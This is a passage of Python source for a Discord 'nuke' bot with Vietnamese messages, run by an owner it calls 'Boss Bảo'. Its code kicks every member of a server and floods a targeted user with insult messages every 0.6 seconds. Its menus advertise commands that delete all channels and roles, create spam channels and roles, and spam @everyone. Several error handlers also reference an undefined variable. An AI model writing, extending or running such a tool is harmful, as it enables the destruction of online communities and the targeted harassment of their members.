async def delete_all_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="kickall")
@is_bot_owner()
async def kick_all_members(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN KICK TẤT CẢ THÀNH VIÊN ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ kick **TOÀN BỘ** thành viên trong server ngoại trừ:\n"
                f"• Bot\n"
                f"• Owner server\n"
                f"• Các ID trong BOT_OWNERS\n\n"
                f"🔹 **Gõ l!confirmkickall để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmkickall":
                await ctx.send("❌ Lệnh kick all đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh kick all đã bị hủy bỏ.")
            return
        embed = discord.Embed(
            title="🚀 ĐANG KICK TẤT CẢ THÀNH VIÊN...",
            description="🔥 **Đang thực hiện kick toàn bộ thành viên trong server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        for member in ctx.guild.members:
            try:
                if (not member.bot and
                    member.id not in BOT_OWNERS and
                    member.id != ctx.guild.owner_id):
                    await member.kick(reason="Server nuke theo lệnh Boss Bảo")
                    await asyncio.sleep(1)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ KICK THÀNH VIÊN HOÀN TẤT",
            description="🎉 **Đã kick thành công tất cả thành viên (ngoại trừ bot, owner và BOT_OWNERS)!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@kick_all_members.error
async def kick_all_members_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="setservername")
@is_bot_owner()
async def set_server_name(ctx, *, new_name: str):
    try:
        if len(new_name) > 100:
            new_name = new_name[:100]
        await ctx.guild.edit(name=new_name)
        embed = discord.Embed(
            title="✅ THAY ĐỔI TÊN SERVER THÀNH CÔNG",
            description=f"🎉 **Tên server đã được đổi thành:** {new_name}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_server_name.error
async def set_server_name_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="setservericon")
@is_bot_owner()
async def set_server_icon(ctx, url: str = None):
    try:
        if url:
            if not url.startswith(('http://', 'https://')):
                raise ValueError("URL không hợp lệ")
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        raise ValueError("Không thể tải hình ảnh từ URL")
                    image_data = await resp.read()
        else:
            image_data = None
        await ctx.guild.edit(icon=image_data)
        embed = discord.Embed(
            title="✅ THAY ĐỔI ICON SERVER THÀNH CÔNG",
            description="🎉 **Icon server đã được cập nhật!**",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_server_icon.error
async def set_server_icon_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Lỗi: {str(e)}")

# ==================== LỆNH QUẢN TRỊ VIÊN (MUTE, UNMUTE, WARN, CLEAR) ====================
@bot.command(name="mute")
@is_bot_owner()
async def mute(ctx, member: discord.Member, *, reason="Không có lý do"):
    """Mute một thành viên (cấm nói) bằng cách gán role Muted."""
    try:
        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        if not muted_role:
            muted_role = await ctx.guild.create_role(name="Muted", permissions=discord.Permissions(send_messages=False, speak=False))
            for channel in ctx.guild.channels:
                try:
                    await channel.set_permissions(muted_role, send_messages=False, speak=False)
                except:
                    pass
        await member.add_roles(muted_role, reason=f"Lệnh từ {ctx.author} - {reason}")
        embed = discord.Embed(
            title="🔇 ĐÃ MUTE THÀNH VIÊN",
            description=f"👤 {member.mention} đã bị mute.\n📌 Lý do: {reason}",
            color=0xFF9900
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi khi mute: {str(e)}")

@bot.command(name="unmute")
@is_bot_owner()
async def unmute(ctx, member: discord.Member):
    """Bỏ mute một thành viên."""
    try:
        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        if muted_role and muted_role in member.roles:
            await member.remove_roles(muted_role, reason=f"Lệnh từ {ctx.author}")
            embed = discord.Embed(
                title="🔊 ĐÃ BỎ MUTE",
                description=f"👤 {member.mention} đã được bỏ mute.",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("⚠️ Thành viên này không bị mute.")
    except Exception as e:
        await ctx.send(f"❌ Lỗi khi unmute: {str(e)}")

@bot.command(name="warn")
@is_bot_owner()
async def warn(ctx, member: discord.Member, *, reason="Cảnh cáo chung"):
    """Gửi cảnh cáo riêng tư đến thành viên."""
    try:
        embed = discord.Embed(
            title="⚠️ CẢNH CÁO TỪ QUẢN TRỊ",
            description=f"Bạn đã bị cảnh cáo trong server **{ctx.guild.name}**\n📌 Lý do: {reason}",
            color=0xFF0000
        )
        await member.send(embed=embed)
        await ctx.send(f"✅ Đã gửi cảnh cáo đến {member.mention}.")
    except discord.Forbidden:
        await ctx.send("❌ Không thể gửi tin nhắn riêng cho thành viên này.")
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="clear")
@is_bot_owner()
async def clear(ctx, amount: int = 10):
    """Xóa tin nhắn trong kênh (tối đa 1000)."""
    if amount < 1 or amount > 1000:
        await ctx.send("⚠️ Số lượng phải từ 1 đến 1000.")
        return
    try:
        deleted = await ctx.channel.purge(limit=amount)
        embed = discord.Embed(
            title="🧹 ĐÃ XÓA TIN NHẮN",
            description=f"Đã xóa {len(deleted)} tin nhắn trong kênh này.",
            color=0x00CCFF
        )
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

# ==================== LỆNH THÊM/XÓA OWNER ====================
@bot.command(name="addowner")
@is_bot_owner()
async def addowner(ctx, target: discord.User):
    if target.id in BOT_OWNERS:
        embed = discord.Embed(
            title="❌ ĐÃ TỒN TẠI!",
            description=f"🎀 **{target}** đã là Owner của bot rồi!",
            color=0xFF007F
        )
        await ctx.send(embed=embed)
        return
    BOT_OWNERS.append(target.id)
    embed = discord.Embed(
        title="✅ THÊM OWNER THÀNH CÔNG!",
        description=f"👑 **{target}** đã được thêm vào danh sách Owner bot thành công!",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@addowner.error
async def addowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="deleteowner")
@is_bot_owner()
async def deleteowner(ctx, target: discord.User):
    if len(BOT_OWNERS) <= 1:
        embed = discord.Embed(
            title="❌ KHÔNG THỂ XÓA!",
            description="🔥 Không thể xóa Owner cuối cùng của bot!",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return
    if target.id not in BOT_OWNERS:
        embed = discord.Embed(
            title="❌ KHÔNG TÌM THẤY!",
            description=f"🎀 **{target}** không phải là Owner!",
            color=0xFF007F
        )
        await ctx.send(embed=embed)
        return
    BOT_OWNERS.remove(target.id)
    embed = discord.Embed(
        title="🗑️ XÓA OWNER THÀNH CÔNG!",
        description=f"📌 **{target}** đã bị xóa khỏi danh sách Owner.",
        color=0xFF9900
    )
    await ctx.send(embed=embed)

@deleteowner.error
async def deleteowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Lỗi: {str(e)}")

# ==================== LỆNH SPAM CHỬI ====================
@bot.command(name="spam")
@is_bot_owner()
async def spam(ctx, member: discord.Member = None, *, custom_text: str = None):
    global spam_task_running, is_spamming
    if member is None:
        embed = discord.Embed(
            title="⚠️ THIẾU THÔNG TIN MỤC TIÊU",
            description="📌 Cú pháp: `l!spam @user [câu chửi tùy chỉnh]`",
            color=0xFF007F
        )
        await ctx.send(embed=embed)
        return
    if spam_task_running and not spam_task_running.done():
        spam_task_running.cancel()
    is_spamming = True
    embed_notice = discord.Embed(
        title="🚨 KÍCH HOẠT LÔI ĐÀI TẤN CÔNG",
        description=f"👑 Mục tiêu {member.mention} bắt đầu spam! Gõ `l!stop` để dừng.",
        color=0xFF69B4
    )
    await ctx.send(embed=embed_notice)

    async def spam_loop():
        try:
            while True:
                if custom_text:
                    msg = f"{member.mention} {custom_text}"
                else:
                    template = random.choice(ROAST_LINES)
                    msg = template.format(username=member.mention)
                await ctx.send(msg)
                await asyncio.sleep(0.6)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"[SPAM ERROR]: {e}")

    spam_task_running = bot.loop.create_task(spam_loop())

@spam.error
async def spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')

@bot.command(name="stop")
@is_bot_owner()
async def stop_bot(ctx):
    global is_spamming, spam_task_running
    is_spamming = False
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None
    embed = discord.Embed(
        title="🛑 ĐÃ DỪNG TOÀN BỘ HOẠT ĐỘNG SPAM",
        description="🎀 Mọi tác vụ spam đã được dừng.",
        color=0xFF0000
    )
    await ctx.send(embed=embed)

@stop_bot.error
async def stop_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')

# ==================== LỆNH CHANNELSLOG (LOG SỰ KIỆN) ====================
@bot.command(name="channelslog")
@is_bot_owner()
async def channelslog(ctx, channel: discord.TextChannel = None):
    """Thiết lập kênh log cho các sự kiện server.
    Cú pháp: l!channelslog #kênh
    Nếu không chỉ định kênh, sẽ tắt log cho server này."""
    if channel is None:
        if ctx.guild.id in SERVER_LOG_CHANNELS:
            del SERVER_LOG_CHANNELS[ctx.guild.id]
        await ctx.send("✅ Đã tắt log sự kiện cho server này.")
        return
    SERVER_LOG_CHANNELS[ctx.guild.id] = channel.id
    embed = discord.Embed(
        title="📋 ĐÃ THIẾT LẬP KÊNH LOG SỰ KIỆN",
        description=f"Tất cả sự kiện server sẽ được gửi vào {channel.mention}",
        color=0x00CCFF,
        timestamp=discord.utils.utcnow()
    )
    embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
    await ctx.send(embed=embed)

@channelslog.error
async def channelslog_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== SỰ KIỆN LOG ====================
async def send_log(guild_id, embed):
    """Gửi embed vào kênh log của server (nếu có)"""
    if guild_id in SERVER_LOG_CHANNELS:
        channel = bot.get_channel(SERVER_LOG_CHANNELS[guild_id])
        if channel:
            try:
                await channel.send(embed=embed)
            except:
                pass

@bot.event
async def on_message_delete(message):
    """Khi tin nhắn bị xóa"""
    if message.guild is None or message.author.bot:
        return
    if not message.content:
        return  # không log nếu tin nhắn trống (ví dụ: chỉ có embed, file)
    
    embed = discord.Embed(
        title="🗑️ TIN NHẮN BỊ XÓA",
        description=f"**Người gửi:** {message.author.mention} (`{message.author.id}`)\n**Kênh:** {message.channel.mention}",
        color=0xFF0000,
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(name="Nội dung", value=message.content[:1000] if message.content else "(không có nội dung)", inline=False)
    embed.set_footer(text=f"ID tin nhắn: {message.id}")
    await send_log(message.guild.id, embed)

@bot.event
async def on_guild_channel_create(channel):
    """Khi kênh được tạo"""
    if channel.guild is None:
        return
    embed = discord.Embed(
        title="🆕 KÊNH MỚI ĐƯỢC TẠO",
        description=f"**Tên:** {channel.mention}\n**Loại:** {channel.type.name}\n**ID:** `{channel.id}`",
        color=0x00FF00,
        timestamp=discord.utils.utcnow()
    )
    await send_log(channel.guild.id, embed)

@bot.event
async def on_guild_channel_delete(channel):
    """Khi kênh bị xóa"""
    if channel.guild is None:
        return
    embed = discord.Embed(
        title="🗑️ KÊNH BỊ XÓA",
        description=f"**Tên cũ:** `{channel.name}`\n**Loại:** {channel.type.name}\n**ID:** `{channel.id}`",
        color=0xFF0000,
        timestamp=discord.utils.utcnow()
    )
    await send_log(channel.guild.id, embed)

@bot.event
async def on_member_join(member):
    """Khi thành viên vào server"""
    if member.guild is None:
        return
    embed = discord.Embed(
        title="👋 THÀNH VIÊN MỚI",
        description=f"{member.mention}\n**Tên:** {member.name}#{member.discriminator}\n**ID:** `{member.id}`",
        color=0x00FF00,
        timestamp=discord.utils.utcnow()
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    await send_log(member.guild.id, embed)

@bot.event
async def on_member_remove(member):
    """Khi thành viên rời server"""
    if member.guild is None:
        return
    embed = discord.Embed(
        title="👋 THÀNH VIÊN RỜI",
        description=f"{member.mention}\n**Tên:** {member.name}#{member.discriminator}\n**ID:** `{member.id}`",
        color=0xFF9900,
        timestamp=discord.utils.utcnow()
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    await send_log(member.guild.id, embed)

@bot.event
async def on_message_edit(before, after):
    """Khi tin nhắn được chỉnh sửa (log nếu nội dung thay đổi)"""
    if before.guild is None or before.author.bot:
        return
    if before.content == after.content:
        return
    if not before.content or not after.content:
        return
    embed = discord.Embed(
        title="✏️ TIN NHẮN ĐƯỢC CHỈNH SỬA",
        description=f"**Người gửi:** {before.author.mention} (`{before.author.id}`)\n**Kênh:** {before.channel.mention}",
        color=0x00CCFF,
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(name="Trước", value=before.content[:1000], inline=False)
    embed.add_field(name="Sau", value=after.content[:1000], inline=False)
    embed.set_footer(text=f"ID tin nhắn: {before.id}")
    await send_log(before.guild.id, embed)

# ==================== LỆNH SETUP (ĐÃ LOẠI BỎ GAME VÀ PERSONA) ====================
@bot.command(name="setup")
@is_bot_owner()
async def setup(ctx):
    embed = discord.Embed(
        title="💖✨ HỆ THỐNG QUẢN TRỊ TỐI CAO GENIUS AI 4.0 ✨💖",
        description=(
            f"🌸 **Kênh kết nối:** {ctx.channel.mention}\n"
            "📋 **Danh sách lệnh điều hành và nuke:**\n\n"
            "🔹 **1. `l!setup`** - Hiển thị bảng điều khiển.\n"
            "🔹 **2. `l!nuke`** - Xóa toàn bộ kênh, tạo 100 kênh, spam tốc độ cao.\n"
            "🔹 **3. `l!spamchannels [số lượng]`** - Tạo kênh spam.\n"
            "🔹 **4. `l!spameveryone`** - Spam @everyone toàn server.\n"
            "🔹 **5. `l!deleteallchannels`** - Xóa tất cả kênh.\n"
            "🔹 **6. `l!spamroles [số lượng]`** - Tạo role spam.\n"
            "🔹 **7. `l!deleteallroles`** - Xóa tất cả role.\n"
            "🔹 **8. `l!kickall`** - Kick toàn bộ thành viên.\n"
            "🔹 **9. `l!setservername [tên]`** - Đổi tên server.\n"
            "🔹 **10. `l!setservericon [url]`** - Đổi avatar server.\n"
            "🔹 **11. `l!spam @user [câu chửi]`** - Spam chửi một người.\n"
            "🔹 **12. `l!stop`** - Dừng spam.\n"
            "🔹 **13. `l!addowner @user`** - Thêm Owner.\n"
            "🔹 **14. `l!deleteowner @user`** - Xóa Owner.\n"
            "🔹 **15. `l!mute @user [lý do]`** - Cấm nói (gán role Muted).\n"
            "🔹 **16. `l!unmute @user`** - Bỏ cấm nói.\n"
            "🔹 **17. `l!warn @user [lý do]`** - Cảnh cáo.\n"
            "🔹 **18. `l!clear [số lượng]`** - Xóa tin nhắn.\n"
            "🔹 **19. `l!stats`** - Xem thông số server.\n"
            "🔹 **20. `l!channelslog #kênh`** - Đặt kênh log sự kiện.\n"
            "🔹 **21. `l!help`** - Hướng dẫn chi tiết."
        ),
        color=0xFF69B4
    )
    embed.set_image(url=CUSTOM_SETUP_GIF)
    embed.set_footer(text="Hệ thống quản trị tối cao • Độc quyền phục vụ Boss Bảo 💖", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@setup.error
async def setup_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')

# ==================== LỆNH STATS ====================
@bot.command(name="stats")
async def stats(ctx):
    guild = ctx.guild
    total_members = guild.member_count
    bots = sum(1 for m in guild.members if m.bot)
    humans = total_members - bots
    text_channels = len(guild.text_channels)
    voice_channels = len(guild.voice_channels)
    categories = len(guild.categories)
    total_channels = len(guild.channels)
    roles_count = len(guild.roles)
    owner = guild.owner.mention if guild.owner else "Không rõ"
    embed = discord.Embed(
        title=f"📊 THÔNG SỐ CHI TIẾT MÁY CHỦ",
        description=(
            f"🏰 **Tên máy chủ:** `{guild.name}`\n"
            f"🆔 **ID:** `{guild.id}`\n"
            f"👑 **Chủ server:** {owner}\n"
            f"🌸 **Bảo trợ:** Boss Bảo"
        ),
        color=0xFF69B4
    )
    embed.add_field(
        name="👥 Thống kê nhân sự",
        value=f"• Tổng: `{total_members}`\n• Người: `{humans}`\n• Bot: `{bots}`",
        inline=True
    )
    embed.add_field(
        name="📁 Kiến trúc",
        value=f"• Tổng kênh: `{total_channels}`\n• Văn bản: `{text_channels}`\n• Thoại: `{voice_channels}`\n• Danh mục: `{categories}`\n• Vai trò: `{roles_count}`",
        inline=True
    )
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text=f"Truy vấn bởi {ctx.author.name} • Phục vụ Boss Bảo", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

# ==================== LỆNH SET LOG NUKE (giữ lại để tương thích) ====================
@bot.command(name="setlognuke")
@is_bot_owner()
async def setlognuke(ctx, channel: discord.TextChannel = None):
    # Giữ lại để không lỗi, nhưng khuyến khích dùng channelslog
    global LOG_CHANNEL_ID
    if channel is None:
        channel = ctx.channel
    LOG_CHANNEL_ID = channel.id
    embed = discord.Embed(
        title="📋 Đã thiết lập kênh log nuke (cũ)",
        description=f"Kênh log nuke sẽ là {channel.mention}\n(Lưu ý: nên dùng `l!channelslog` để log đầy đủ sự kiện)",
        color=0x00CCFF,
        timestamp=discord.utils.utcnow()
    )
    embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
    await ctx.send(embed=embed)

# ==================== LỆNH HELP ====================
@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📖 CẨM NANG ĐIỀU HÀNH GENIUS AI 4.0",
        description=(
            "Chào mừng đến với hệ thống quản trị tối cao của **Boss Bảo**.\n\n"
            "**LỆNH DÀNH CHO OWNER:**\n"
            "• `l!setup` - Bảng điều khiển\n"
            "• `l!nuke` - Phá hủy server (tốc độ cao)\n"
            "• `l!spamchannels [số]` - Tạo kênh spam\n"
            "• `l!spameveryone` - Spam toàn server\n"
            "• `l!deleteallchannels` - Xóa hết kênh\n"
            "• `l!spamroles [số]` - Tạo role spam\n"
            "• `l!deleteallroles` - Xóa hết role\n"
            "• `l!kickall` - Kick hết member\n"
            "• `l!setservername [tên]` - Đổi tên server\n"
            "• `l!setservericon [url]` - Đổi avatar server\n"
            "• `l!spam @user [câu]` - Spam chửi\n"
            "• `l!stop` - Dừng spam\n"
            "• `l!addowner @user` - Thêm Owner\n"
            "• `l!deleteowner @user` - Xóa Owner\n"
            "• `l!mute @user [lý do]` - Cấm nói (role Muted)\n"
            "• `l!unmute @user` - Bỏ cấm nói\n"
            "• `l!warn @user [lý do]` - Cảnh cáo\n"
            "• `l!clear [số]` - Xóa tin nhắn\n"
            "• `l!setlognuke #channel` - Đặt kênh log nuke (cũ)\n"
            "• `l!channelslog #channel` - Đặt kênh log sự kiện (xóa, sửa, join, leave...)\n\n"
            "**LỆNH CÔNG KHAI:**\n"
            "• `l!stats` - Xem thông số server\n"
            "• `l!help` - Bảng hướng dẫn này"
        ),
        color=0xFF69B4
    )
    embed.set_footer(text="Hệ thống quản trị tối cao • Tôn vinh Boss Bảo", icon_url=bot.user.display_avatar.url)
    await ctx.send(embed=embed)

# ==================== SỰ KIỆN PHÁT HIỆN TAG OWNER ====================
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Xử lý lệnh trước
    await bot.process_commands(message)

    # Kiểm tra nếu tin nhắn có tag bất kỳ owner nào
    if message.mentions:
        for user in message.mentions:
            if user.id in BOT_OWNERS:
                await message.reply("oi tag gì thế thích boss bảo tui à s k ns?")
                break  # chỉ trả lời một lần

# ==================== SỰ KIỆN ON_READY ====================
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("✨ Bot đã khởi chạy thành công với tiền tố l! - Phục vụ Boss Bảo!")
    print(f"👑 Danh sách Owner: {BOT_OWNERS}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, (commands.CommandNotFound, discord.errors.Forbidden)):
        return
    print(f"[ERROR]: {error}")

# ==================== CHẠY BOT ====================
if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)
